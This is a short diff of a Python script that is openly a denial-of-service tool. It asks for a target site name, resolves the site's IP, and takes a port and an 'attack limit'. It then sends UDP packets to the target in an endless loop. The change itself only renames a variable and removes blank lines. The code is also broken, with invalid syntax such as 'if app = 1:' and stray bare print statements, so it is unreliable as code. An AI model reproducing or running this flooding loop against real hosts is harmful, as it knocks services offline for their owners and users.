@@ -35,10 +35,8 @@ print
 
 print
 app = int(input('select a number to launch the app'))
-
-ddosattack = 1
-
-if app = ddosattack :
+print
+if app = 1:
     print
 site = input('Имя сайта: ')
 ip = socket.gethostbyname(site) 
@@ -50,8 +48,6 @@ print
 port = int(input('port: '))
 print
 limit = int(input('attack limit: '))
-
-
 
 while True:
      sock.sendto(bytes, (ip,port))
